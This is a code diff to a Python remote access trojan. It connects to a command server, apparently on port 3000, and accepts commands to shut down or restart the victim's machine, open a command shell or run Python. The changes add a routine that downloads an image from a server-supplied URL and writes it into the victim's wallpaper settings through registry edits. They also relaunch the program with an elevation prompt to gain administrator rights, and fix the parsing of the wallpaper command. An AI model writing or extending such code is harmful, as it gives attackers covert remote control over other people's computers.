@@ -5,7 +5,8 @@ from io import StringIO, BytesIO
 from cryptography.fernet import Fernet
 
 
-strHost = "10.5.148.3"
+# strHost = "10.5.148.3"
+strHost = "127.0.0.1"
 intPort = 3000
 
 strPath = os.path.realpath(sys.argv[0])  # get file path
@@ -329,30 +330,34 @@ def shutdown(shutdowntype):
     except Exception:
         send(b"unable to execute command")
 
+def executeSetWallpaper(url):
+    try:
+        path = os.path.join(TMP, 'wallpaper.jpg')
+        print("path: " + path)
+        path_file = "C:/Users/{0}/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper".format(getpass.getuser())
+
+        image = requests.get(url)
+        with open(path_file, 'wb') as f:
+            f.write(image.content)
+
+        with open(path, 'wb') as f:
+            f.write(image.content)
+
+        os.system('reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{0}" /f'.format(path))
+        os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
+    except Exception:
+        pass
 
 def setWallpaper(url):
     if ctypes.windll.shell32.IsUserAnAdmin():
-        try:
-            path = os.path.join(os.getcwd(), 'wallpaper.jpg')
-            path_file = "C:/Users/{0}/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper".format(getpass.getuser())
-
-            image = requests.get(url)
-            with open(path_file, 'wb') as f:
-                f.write(image.content)
-
-            with open(path, 'wb') as f:
-                f.write(image.content)
-
-            os.system('reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{0}" /f'.format(path))
-            os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
-        except Exception:
-            send(b"unable to set wallpaper (file needs to be jpg")
+        executeSetWallpaper(url)
     else:
         hinstance = ctypes.windll.shell32.ShellExecuteW(
             None, 'runas', sys.executable, sys.argv[0], None, SW.SHOWNORMAL
         )
         if hinstance <= 32:
             raise RuntimeError(ERROR(hinstance))
+        executeSetWallpaper(url)
 
 
 def command_shell():
@@ -603,9 +608,9 @@ while True:
                 shutdown("-r")
             elif strData == "test":
                 continue
-            elif strData[:1] == "wallpaper":
-                print(strData[:])
-                setWallpaper(strData[1:])
+            elif strData[:9] == "wallpaper":
+                print(strData[9:])
+                setWallpaper(strData[9:])
             elif strData == "cmd":
                 command_shell()
             elif strData == "python":
